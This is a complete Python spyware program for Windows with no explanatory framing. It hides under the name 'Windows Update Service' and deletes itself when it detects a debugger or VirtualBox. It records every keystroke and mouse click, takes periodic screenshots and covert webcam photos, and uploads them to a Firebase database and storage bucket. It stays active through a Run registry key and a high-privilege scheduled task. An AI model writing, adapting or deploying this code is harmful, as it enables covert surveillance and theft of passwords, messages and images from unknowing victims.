import os
import cv2
import time
import threading
import pyrebase
import pyautogui
import sys
import winreg as reg
import json
import socket
import random
import string
from pynput import keyboard, mouse
import ctypes
from datetime import datetime

# Hide from Taskbar 
ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")

# Prevent Debugging
if sys.gettrace():
    os.remove(sys.argv[0])
    exit()

# VirtualBox Detection
if os.path.exists("C:\\Windows\\System32\\drivers\\VBoxMouse.sys"):
    os.remove(sys.argv[0])
    exit()    


# Firebase Configuration
firebase_config = {
  "apiKey": "Your firebase API_KEY",
  "authDomain": "Your_project_name_on_firebase.firebaseapp.com",
  'databaseURL': "your Realtime dtabase URL",
  'storageBucket': "Your Firebase Storage",
}

firebase = pyrebase.initialize_app(firebase_config)
db = firebase.database()
storage = firebase.storage()

# Check Internet Connection
def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError:
        return False

# Take Screenshot and Upload Immediately
def first_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot = pyautogui.screenshot()
    path = f"first_screenshot_{timestamp}.jpg"
    screenshot.save(path, "JPEG", quality=50)
    
    if is_connected():
        storage.child(f"screenshots/{path}").put(path)
        os.remove(path)


# Take Webcam Photo and Upload Immediately
from datetime import datetime
def first_webcam_capture():
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    ret, frame = cam.read()  
    if ret:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename =f"first_Photo_{timestamp}.jpg"
        cv2.imwrite(filename, frame)
        if is_connected():
            storage.child(f"camera/{filename}").put(filename)
            os.remove(filename)
    cam.release()

# Mouse Click Logger
def on_click(x, y, button, pressed):
    if pressed:
        log_data = {"type": "mouse_click", "data": f"Clicked at {x}, {y}", "time": time.time()}
        db.child("mouse_clicks").push(log_data)

# Keylogger
def on_press(key):
    try:
        log_data = {"type": "keystroke", "data": str(key), "time": time.time()}
        db.child("keystrokes").push(log_data)
    except:
        pass

# Capture Screenshot Every 5 Minutes
def capture_screenshot():
    while True:
        time.sleep(300)
        screenshot = pyautogui.screenshot()
        path = f"screenshot_{int(time.time())}.jpg"
        screenshot.save(path, "JPEG", quality=50)

        if is_connected():
            storage.child(f"screenshots/{path}").put(path)
            os.remove(path)

# Capture Webcam Image Every 10 Minutes
def capture_webcam():
    cam = cv2.VideoCapture(0)
    while True:
        time.sleep(600)
        ret, frame = cam.read()
        if ret:
            filename = f"{''.join(random.choices(string.ascii_letters, k=10))}.jpg"
            cv2.imwrite(filename, frame)
            if is_connected():
                storage.child(f"camera/{filename}").put(filename)
                os.remove(filename)
        cam.release()

# Add to Startup
def add_to_startup():
    file_path = os.path.abspath(__file__)
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "WindowsUpdate", 0, reg.REG_SZ, file_path)
    reg.CloseKey(reg_key)
    os.system(f'schtasks /create /tn "Windows Update" /tr "{file_path}" /sc onlogon /rl highest')

# Start Listeners
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)
screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
webcam_thread = threading.Thread(target=capture_webcam, daemon=True)

# Capture First Screenshot & Webcam Photo
first_screenshot()
first_webcam_capture()

# Add to Startup
add_to_startup()

# Start Threads
keyboard_listener.start()
mouse_listener.start()
screenshot_thread.start()
webcam_thread.start()

keyboard_listener.join()
mouse_listener.join()
